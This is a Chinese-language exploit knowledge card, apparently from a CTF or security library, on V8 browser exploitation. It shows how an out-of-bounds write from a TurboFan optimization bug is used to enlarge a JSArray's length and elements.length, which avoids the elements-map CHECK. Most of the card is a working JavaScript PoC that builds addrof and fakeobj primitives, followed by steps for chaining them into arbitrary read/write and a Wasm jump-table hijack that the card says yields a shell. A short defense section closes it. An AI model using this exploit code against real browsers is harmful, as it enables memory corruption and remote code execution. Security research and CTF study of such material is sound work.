---
id: binary-pwn-browser-v8-oob-length-overwrite-bypass-elements-map-check-addrof-fakeobj
title: V8 新版 elements map 校验下：只改 JSArray 的 length 与 elements.length 撑大越界，绕开 CHECK 得到稳定 OOB 对象数组与 addrof/fakeobj
type: scenario
domain: binary
path: binary/pwn/browser
technique: jsarray-length-overwrite-bypass-elements-map-check-stable-oob-addrof-fakeobj
aliases:
- 改 length 而非 elements 指针
- 撑大 corrupted_array.length
- 0x1000_0000_0000n
- elements map CHECK 绕过
- IsFixedDoubleArray Fatal error 规避
- 稳定越界对象数组
- foo(x)=x+x 优化判定
tags:
- binary
- pwn
- browser
- v8
- turbofan
- oob
- jsarray-length
- elements-map-check
- addrof
- fakeobj
- pointer-compression
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-6
  verified_at: '2026-11-08T01:17:26+08:00'
  notes: 已对照原文（715 行 + 逐张核对 15 图）核对：图 08 为直接改 elements 指针触发 IsFixedDoubleArray CHECK 崩溃（失败路径，本卡背景）；原文 EXP（优化版与原版）含完整 test()/addrof()/fakeobj() 实现，且被后续 arb_read/arb_write/Wasm jump_table_start 覆盖实际调用；图 15 为 ./d8 script.js 运行完整 EXP 后真 getshell 的终端，证明本卡的稳定 OOB 对象数组与 addrof/fakeobj 原语在打通的链中实际生效。本卡结论只写到 addrof/fakeobj 原语，severity high、tags 无 rce，未把理论链包装成 RCE；卡内『整条链最终 getshell 已验证』是对原文事实的陈述且明确指整条链而非本卡。dedup 复查除自身外 top 候选（fake-array-jstypedarray-dataptr-aar-aaw 为伪造 fake_array 的不同路线、j2v8-thehole、wasm-lazycompile-jump-table-start、cve-2024-12695 等）verdict 全为 new、无同 sink/同链卡，cards.json dedup_review 理由成立。路径 binary/pwn/browser 合法。未验证点：卡内无 sources/source_url 字段（本库统一）；偏移 9/7/2 与 0x1000_0000_0000n 需按堆布局/版本实测（卡内已注明）；生产 V8 无初始优化 bug 则链不成立（卡内已注明）。
---

## 一句话结论

新版 V8 会校验 elements 对象的 map，直接把 elements 指针改到任意地址会触发 `Check failed: IsFixedDoubleArray(...)` 崩溃；改用 `foo(x)=x+x` 被优化成 5 的越界写，把相邻 `corrupted_array` 的 `length` 与其 `elements.length` 各加上 `0x1000_0000_0000n`（只改长度、不改 elements 指针），即可得到一对稳定越界的对象数组，用 `o[1][0]=obj; ftoi(o[0][9])>>32n` 实现 addrof、`o[0][9]=itof((addr<<32n)+2n)` 实现 fakeobj。

## 原理

- **为什么直接改 elements 指针不行**：`victim[idx] = i2f(0xdeadbeefn)` 覆盖 elements 指针后，`JSObject::GetElementsKind` 会 CHECK elements 的 map 必须是 `FixedDoubleArray`（或 empty_fixed_array），否则报 `Fatal error in ../../src/objects/js-objects-inl.h, line 745: Check failed: IsFixedDoubleArray(fixed_array, cage_base) || ...` 崩溃。伪造 fake_array 路线因此受阻。
- **改 length 不触发该 CHECK**：length 是 JSArray 对象内的字段，改它不会让 elements 指向非法对象，elements 仍是合法的 FixedDoubleArray，只是"声明长度"被撑大；随后通过 `corrupting_array[...]` 的越界下标即可越界读写相邻对象内存，绕开了 map 校验。
- **如何拿到可控越界下标**：`function foo(x){return x+x;}` 在 `x=2` 时经 TurboFan 的 `2+2=>5` 折叠返回 5（`res=5`），于是 `res-4=1`（未优化时为 0），`(res-4)*7` 与 `(res-4)*2` 成为越界下标；优化未完成时赋值不生效，因此外层用 `if (o[0].length != 3) break;` 定位优化完成的时刻。
- **两处改写**：`corrupting_array[(res-4)*7]` 命中 `corrupted_array` 对象的 length 字段，加 `0x1000_0000_0000n` 把 length 撑大；`corrupting_array[(res-4)*2]` 命中 `corrupted_array.elements` 对象的 length 字段，同样撑大，使越界访问稳定且不触发越界报错。
- **addrof/fakeobj**：`o = [corrupted_array, buf_array]`（buf_array 是 `[{}]` 对象数组）。`o[1][0] = obj` 把对象写入 buf_array 的元素槽，`o[0][9]` 越界读到该槽的原始值，`ftoi(...)>>32n` 取出压缩指针即对象地址；反向把地址 `<<32n + 2n` 写回 `o[0][9]`，`o[1][0]` 就被解释成该地址的对象（fakeobj）。
- **为什么成立（本质）**：V8 的对象数组元素槽里存的是带标记的压缩指针，相邻数组对象在堆上连续布局；只篡改 length/elements.length 让引擎"合法地"越界到相邻对象的字段，既不破坏 elements map 校验，又把短距 OOB 升级为可重复使用的对象数组读写原语。
- **完整性**：这是从短距 OOB 到稳定 addrof/fakeobj 的完整原语，被后续 AAR/AAW 与控制流劫持直接复用；整条链最终 getshell 已验证。

## 触发条件

- 已有"优化 bug 产生的可控数组越界写"（如 2+2=>5），且目标 V8 启用了 elements map 校验（直接改 elements 指针会 CHECK 崩溃）。
- 能在同一函数内按固定顺序分配 `corrupting_array`、`corrupted_array`、对象数组 `buf_array`，使堆布局相邻、偏移固定。
- 能触发并判定 TurboFan 优化完成时机（外层循环 + length 变化判断）。
- `ftoi/itof` 与 BigInt 转换可用（ArrayBuffer/Float64Array/Uint32Array 视图）。

## 利用步骤

1. 定义 `foo(x){return x+x;}`，在 `test()` 里先 `for(...) res=foo(2);` 触发优化使 `res=5`。
2. 依次分配 `corrupting_array=[0.1,0.1]`、`corrupted_array=[0.1,0.1,0.1]`、`buf_array=[{}]`。
3. 用 `corrupting_array[(res-4)*7]` 读到 `corrupted_array` 的 length，加 `0x1000_0000_0000n` 写回；用 `corrupting_array[(res-4)*2]` 同法改 `corrupted_array.elements` 的 length。
4. 返回 `[corrupted_array, buf_array]`；外层循环 `if (o[0].length != 3) break;` 拿到优化完成后的稳定越界对象数组对 `o`。
5. 实现 `addrof(obj){ o[1][0]=obj; return ftoi(o[0][9])>>32n; }` 与 `fakeobj(addr){ o[0][9]=itof((addr<<32n)+2n); return o[1][0]; }`。
6. 将该原语交给后续 JSTypedArray data_ptr 改写（AAR/AAW）与 Wasm jump_table_start 劫持。

## PoC

```javascript
function foo(x) { return x + x; }
function test() {
  let res = 0;
  for (let i = 0; i < 1000; ++i) res = foo(2);      // 优化后 res = 5
  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1, 0.1, 0.1];
  let buf_array = [{}];
  let overwrite = ftoi(corrupting_array[(res-4)*7]) + 0x1000_0000_0000n;
  corrupting_array[(res-4)*7] = itof(overwrite);     // 撑大 corrupted_array.length
  overwrite = ftoi(corrupting_array[(res-4)*2]) + 0x1000_0000_0000n;
  corrupting_array[(res-4)*2] = itof(overwrite);     // 撑大 elements.length
  return [corrupted_array, buf_array];
}
let o;
for (let i = 0; i < 1000; i++) { o = test(); if (o[0].length != 3) break; }
function addrof(obj) { o[1][0] = obj; return ftoi(o[0][9]) >> 32n; }
function fakeobj(addr) { o[0][9] = itof((addr << 32n) + 2n); return o[1][0]; }
```

`ftoi/itof` 用 `ArrayBuffer(8)` + `Float64Array`/`Uint32Array` 视图实现；偏移 9/7/2 与 `0x1000_0000_0000n` 需按堆布局与版本实测。

## 变体与关联

- **偏移变体**：`(res-4)*7`、`(res-4)*2`、槽位 9 等随堆布局与 V8 版本变化，用 `%DebugPrint()` 实测；核心是"改两个 length 字段"而非改指针。
- **关联**：前置是 `2+2=>5` 优化 bug 产生的 OOB（见对应卡）；与库内"伪造 fake doubleArray + fake elements 的 fake_array 路线"是**不同路线**（本卡不伪造对象、不依赖 fakeobj 构造假对象，而是靠 length 撑大得到稳定 OOB）；后续接 JSTypedArray data_ptr AAR/AAW 与 Wasm jump_table_start 劫持。
- **边界**：未启用 elements map 校验时传统改 elements 指针即可，无需此路线；生产 V8 若无优化 bug 则无初始 OOB；堆布局随机化会破坏固定偏移。

## 检测与防御

- **修复**：数组 length 与 elements.length 应做完整性/上界校验，禁止运行时被越界写撑到远超实际分配；elements 访问始终做真实边界检查。
- **检测**：监控 JSArray length 出现异常大值（如含 `0x1000_0000_0000` 高位）、对象数组元素槽出现非法标记指针、大量 `%DebugPrint` 使用。
- **加固**：堆布局随机化、隔离对象数组与浮点数组、对 JIT 优化结果做差分验证；生产关闭 natives 调试接口。
